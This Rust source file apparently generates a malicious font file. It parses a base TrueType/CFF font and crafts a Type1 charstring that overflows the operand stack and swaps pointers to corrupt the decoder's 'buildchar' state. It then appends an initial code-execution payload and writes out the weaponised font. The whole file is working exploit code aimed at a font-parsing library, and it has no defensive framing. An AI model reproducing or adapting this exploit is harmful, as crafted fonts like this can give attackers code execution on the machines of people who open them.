use crate::cff::{CffFile, Type1CharString, Type1CharStringOp};
use crate::payload::code_exec::InitialCodeExecPayload;
use crate::payload::exploit_config::ExploitConfig;
use crate::payload::payload_builder::CffPayloadBuilder;
use crate::payload::Payload;
use anyhow::anyhow;
use parse::ParseBytes;

pub fn create_cff<Cfg: ExploitConfig>() -> anyhow::Result<Vec<u8>> {
    // Load and parse a base file
    let tmp = std::fs::read("Base.ttf")?;
    let (rest_of_tmp, file) =
        CffFile::parse(&tmp).map_err(|_| anyhow!("Failed to parse CFF file"))?;

    let mut file_copy = file.clone();

    let mut c = Type1CharString { ops: Vec::new() };

    {
        // Fill up the value stack
        for _ in 0..Cfg::PUSH_COUNT {
            c.ops.push(Type1CharStringOp::Push(1));
        }

        // Swap the ptr for `zone` until it overwrites `buildchar`
        for _ in 0..Cfg::SWAP_COUNT {
            c.ops.push(Type1CharStringOp::Random);
            c.ops.push(Type1CharStringOp::Exch);
        }

        // Put something random into `len_buildchar`, now it's probably not 0
        c.ops.push(Type1CharStringOp::Random);

        // Drop back down so we can use push again
        for _ in 0..Cfg::DROP_COUNT {
            c.ops.push(Type1CharStringOp::Drop);
        }
    }

    let mut builder = CffPayloadBuilder { ops: &mut c.ops };

    InitialCodeExecPayload::default().build_cff::<Cfg>(&mut builder);

    c.ops.push(Type1CharStringOp::EndChar);

    let mut cs = Vec::new();
    c.write(&mut cs);
    file_copy.charstrings_idx.data[1] = cs;

    let mut tmp = Vec::new();
    file_copy.write(&mut tmp);
    tmp.extend_from_slice(rest_of_tmp);

    Ok(tmp)

    // See cff_decoder_parse_charstrings for the contents
}
